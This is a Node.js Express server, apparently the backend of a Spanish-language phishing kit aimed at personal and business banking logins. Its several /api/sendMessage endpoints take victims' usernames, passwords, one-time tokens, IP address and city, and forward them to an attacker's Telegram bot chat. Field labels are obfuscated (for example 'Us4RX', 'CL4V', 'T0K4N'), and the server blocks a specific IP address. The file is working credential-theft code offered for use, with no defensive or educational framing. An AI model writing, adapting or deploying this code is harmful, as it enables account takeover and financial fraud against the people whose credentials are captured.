const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Importar cors
const axios = require('axios');
const app = express();




app.use(cors({
    origin: '*', // Permitir cualquier origen
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});

app.use((req, res, next) => {
  const ipCliente = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const IP_BLOQUEADAS = ['179.7.73.123']; // Las que quieras bloquear

  if (IP_BLOQUEADAS.includes(ipCliente)) {
    console.log(`⛔ IP bloqueada: ${ipCliente}`);
    return res.status(403).send('Acceso denegado');
  }

  next();
});


app.post('/api/sendMessage', async (req, res) => {
    const { user, passa, ip, city } = req.body;

    if (!user || !passa || !ip) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🟢PLAZA PERSO VIEJO🟢\nUs4RX: <code>${user}</code>\nCL4V: <code>${passa}</code>\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🟢PLAZA TOKEN VIEJO🟢\nUs4RX: <code>${user}</code>\nT0K4N: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessageEmpre', async (req, res) => {
    const { user, passa, ip, city } = req.body;

    if (!user || !passa || !ip) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🟢PLAZA EMPRESA🟢\nUs4RX: <code>${user}</code>\nCL4V: <code>${passa}</code>\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🟢PLAZA TOKEN VIEJO🟢\nUs4RX: <code>${user}</code>\nT0K4N: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessages', async (req, res) => {
    const { user, passa, ip, city } = req.body;

    if (!user || !passa || !ip) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🟢PLAZA PERSO NUEVO🟢\nUs4RX: <code>${user}</code>\nCL4V: <code>${passa}</code>\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});


app.post('/api/sendMessages2', async (req, res) => {
    const { user, pass, ip, city } = req.body;

    if (!user || !ip || !pass) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🟢PLAZA TOKEN NUEVO🟢\nUs4RX: <code>${user}</code>\nT0K4N: <code>${pass}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});




const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
